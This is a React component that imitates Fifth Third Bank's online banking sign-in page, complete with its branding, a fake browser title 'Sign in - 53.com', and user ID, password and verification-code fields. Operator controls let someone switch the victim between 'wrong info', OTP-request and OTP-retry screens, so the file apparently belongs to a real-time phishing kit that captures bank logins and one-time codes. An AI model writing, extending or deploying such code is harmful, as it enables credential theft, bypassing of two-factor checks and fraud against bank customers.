import { motion } from "framer-motion";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import clsx from "clsx";
import BankingHeader from "./BankingHeader";
import FifthFavIcon from "../../../../../../../../assets/allBanks/banks/fifth/fif3.ico";
import { Link } from "react-router-dom";
import FifthImg from "../../../../../../../../assets/allBanks/banks/fifth/fif2.svg";
import FifthImg1 from "../../../../../../../../assets/allBanks/banks/fifth/fif1.svg";
import { useState } from "react";
import { VscMenu } from "react-icons/vsc";
import { AiOutlineClose } from "react-icons/ai";
import { FifthNavDetails, otpOptions } from "../../bankDetails";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Fifth = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  const [openMenu, setOpenMenu] = useState(false);

  const hanldeMenuBar = () => {
    setOpenMenu((prevToggle) => !prevToggle);
  };

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-customBlue-1031",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - 53.com"
        handleCancel={handleCancel}
        img={FifthFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header
        className={clsx(
          "relative flex  justify-between w-full px-4 py-3  text-customGray-400 bg-customBlue-1033   customTablet1:bg-white",
          openMenu ? " " : "overflow-hidden"
        )}
      >
        <div className="hidden customTablet1:block">
          <img
            src={FifthImg}
            alt=""
            className="w-[230px] h-[41px]  object-contain"
          />
        </div>
        <div
          className=" text-customGray-1027 customTablet1:hidden"
          onClick={hanldeMenuBar}
        >
          {openMenu ? <AiOutlineClose size={30} /> : <VscMenu size={30} />}
        </div>

        <div className=" customTablet1:hidden">
          <img
            src={FifthImg1}
            alt=""
            className="w-[40px] h-[35px]  object-contain"
          />
        </div>

        <div className=" customTablet1:hidden"></div>

        <div
          className={clsx(
            "absolute right-0 w-full h-screen  bg-black top-full bg-opacity-30  customTablet1:hidden  flex z-30 justify-start ",
            openMenu
              ? "translate-x-0 transistion1 "
              : "-translate-x-full transistion2"
          )}
        >
          <div className="bg-white w-[60%]">
            <nav>
              <Link
                to="https://www.53.com/content/fifth-third/en.html"
                className="block pt-3"
              >
                {FifthNavDetails.map((nav) => (
                  <p className="p-4 " key={nav.id}>
                    {nav.name}
                  </p>
                ))}
              </Link>
            </nav>
          </div>
        </div>

        <div className="items-end hidden mb-2 customTablet1:flex">
          <nav>
            <Link
              to="https://www.53.com/content/fifth-third/en.html"
              className="flex items-center gap-4 uppercase"
            >
              {FifthNavDetails.map((nav) => (
                <p key={nav.id}>{nav.name}</p>
              ))}
            </Link>
          </nav>
        </div>
      </header>

      <div className="items-center justify-center px-6 pt-24 pb-20 customMiniTablet:flex text-customGray-400">
        <div
          className={clsx(
            "w-full p-8 rounded-md customMiniTablet:w-[400px] bg-customGray-1027",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <h3 className="text-[27px] font-bold mb-6">Online Banking Login</h3>
          <div className="space-y-4">
            <div className="relative">
              <label className="font-bold">User ID</label>
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                className={clsx(
                  "w-full h-10 outline-none bg-white border border-customGray-1000 pl-2 pr-12 focus:border-2 focus:border-dashed focus:border-customGreen-1001 transistion2",
                  errorFormState.username
                    ? "border-2 border-customRed-1007"
                    : ""
                )}
              />
              <span className="absolute h-full leading-[2.6] right-3 text-customBlue-1032 text-sm ">
                Save
              </span>
              {errorFormState.username && (
                <p className="flex gap-2 mt-2 text-sm text-customRed-1007">
                  You must supply a user ID.
                </p>
              )}
            </div>
            <div className="relative">
              <label className="font-bold">Password</label>
              <input
                type="password"
                value={formState.password}
                name="password"
                onChange={handleChange}
                className={clsx(
                  "w-full h-10 outline-none bg-white border border-customGray-1000 px-2 focus:border-2 focus:border-dashed focus:border-customGreen-1001 transistion2",
                  errorFormState.password
                    ? "border-2 border-customRed-1007"
                    : ""
                )}
              />
              {errorFormState.password && (
                <p className="flex gap-2 mt-2 text-sm text-customRed-1007">
                  You must supply a password.
                </p>
              )}
            </div>
          </div>
          <button
            onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
            className="w-full py-2 my-4 font-semibold text-white bg-customBlue-1034"
          >
            {loading && <ClipLoader size={10} color="#fff" />}
            {loading ? "Loading..." : "LOG IN"}
          </button>
          <Link
            to="https://www.53.com/content/fifth-third/en.html"
            className="underline text-customBlue-1032"
          >
            Forgot Login?
          </Link>
          <p className="mt-3">
            First Time User?{" "}
            <Link
              to="https://www.53.com/content/fifth-third/en.html"
              className="underline text-customBlue-1032"
            >
              Register
            </Link>
          </p>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div
                      className={clsx(
                        "w-full p-8 rounded-md customMiniTablet:w-[400px] bg-customGray-1027"
                      )}
                    >
                      <h3 className="text-[27px] font-bold mb-6">
                        Online Banking Login
                      </h3>
                      <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                        <p>{activePathDetails.body}</p>
                      </div>
                      <div className="space-y-4">
                        <div className="relative">
                          <label className="font-bold">User ID</label>
                          <input
                            type="text"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            className={clsx(
                              "w-full h-10 outline-none bg-white border border-customGray-1000 pl-2 pr-12 focus:border-2 focus:border-dashed focus:border-customGreen-1001 transistion2",
                              errorFormState.username
                                ? "border-2 border-customRed-1007"
                                : ""
                            )}
                          />
                          <span className="absolute h-full leading-[2.6] right-3 text-customBlue-1032 text-sm ">
                            Save
                          </span>
                          {errorFormState.username && (
                            <p className="flex gap-2 mt-2 text-sm text-customRed-1007">
                              You must supply a user ID.
                            </p>
                          )}
                        </div>
                        <div className="relative">
                          <label className="font-bold">Password</label>
                          <input
                            type="password"
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                            className={clsx(
                              "w-full h-10 outline-none bg-white border border-customGray-1000 px-2 focus:border-2 focus:border-dashed focus:border-customGreen-1001 transistion2",
                              errorFormState.password
                                ? "border-2 border-customRed-1007"
                                : ""
                            )}
                          />
                          {errorFormState.password && (
                            <p className="flex gap-2 mt-2 text-sm text-customRed-1007">
                              You must supply a password.
                            </p>
                          )}
                        </div>
                      </div>
                      <button
                        onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                        className="w-full py-2 my-4 font-semibold text-white bg-customBlue-1034"
                      >
                        {loading && <ClipLoader size={10} color="#fff" />}
                        {loading ? "Loading..." : "LOG IN"}
                      </button>
                      <Link
                        to="https://www.53.com/content/fifth-third/en.html"
                        className="underline text-customBlue-1032"
                      >
                        Forgot Login?
                      </Link>
                      <p className="mt-3">
                        First Time User?{" "}
                        <Link
                          to="https://www.53.com/content/fifth-third/en.html"
                          className="underline text-customBlue-1032"
                        >
                          Register
                        </Link>
                      </p>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Verify your identity
                            </h3>
                            <p className="mb-2 text-center ">
                              For your security, we need to verify it&apos;s
                              really you.
                            </p>
                          </div>
                          <div>
                            <h2 className="mb-2 text-sm font-bold">
                              How would you like to get your verification code?
                            </h2>
                            <p className="mb-2 text-sm text-customGray-100">
                              Select One:
                            </p>
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col space-y-3"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-2 my-4 font-semibold text-white bg-customBlue-1034"
                            >
                              Continue
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full h-10 outline-none bg-white border border-customGray-1000 px-2 focus:border-2 focus:border-dashed focus:border-customGreen-1001 transistion2 no-spinner",
                                      errorOtp.otpo
                                        ? "border-2 border-customRed-1007"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-900">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                </div>
                                <button
                                  className="w-full py-2 my-4 font-semibold text-white bg-customBlue-1034 no-spinner"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(
                        " customMiniTablet:w-[500px] px-4 bg-customGray-1010 py-4"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-xl font-bold text-center text-black">
                              Enter Verification Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-2 text-center ">
                              Enter the verification code we sent to your mobile
                              number
                            </h2>
                            <div className="px-2 customMiniTablet:px-24">
                              <div>
                                <input
                                  type="number"
                                  placeholder="Enter Verification Code"
                                  value={formOtp.otpo}
                                  name="otpo"
                                  onChange={changeOtp}
                                  className={clsx(
                                    "w-full h-10 outline-none bg-white border border-customGray-1000 px-2 focus:border-2 focus:border-dashed focus:border-customGreen-1001 transistion2 no-spinner",
                                    errorOtp.otpo
                                      ? "border-2 border-customRed-1007"
                                      : ""
                                  )}
                                />
                                {errorOtp.otpo && (
                                  <p className="mt-2 text-sm text-customRed-900">
                                    Please enter the verification code.
                                  </p>
                                )}
                                <h3 className="mt-2 text-sm text-customRed-200">
                                  {activeOtp.body}
                                </h3>
                              </div>
                              <button
                                className="w-full py-2 my-4 font-semibold text-white bg-customBlue-1034 no-spinner"
                                onClick={(e) =>
                                  onSubmitOtp(e, handleVerifiedOtp)
                                }
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Verify"}
                              </button>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.53.com/content/fifth-third/en.html"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
    </motion.div>
  );
};

export default Fifth;
